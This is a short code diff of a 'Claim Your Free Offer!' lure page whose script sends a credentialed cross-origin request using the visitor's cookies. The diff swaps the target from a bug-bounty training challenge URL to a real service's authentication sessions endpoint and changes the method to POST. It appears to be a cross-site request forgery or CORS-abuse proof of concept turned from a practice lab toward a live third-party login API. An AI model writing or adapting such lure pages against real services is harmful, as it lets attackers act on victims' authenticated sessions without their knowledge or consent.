@@ -8,7 +8,7 @@
   <h1>Claim Your Free Offer!</h1>
   <script>
     var req = new XMLHttpRequest();
-    req.open('GET', 'https://www.bugbountytraining.com/challenges/challenge-16.php', true);
+    req.open('POST', 'https://account.proton.me/api/auth/v4/sessions', true);
     req.withCredentials = true; // Send cookies
     req.setRequestHeader('Content-Type', 'application/json'); // Ensures request is accepted
     req.send('{}'); // Sending an empty JSON body
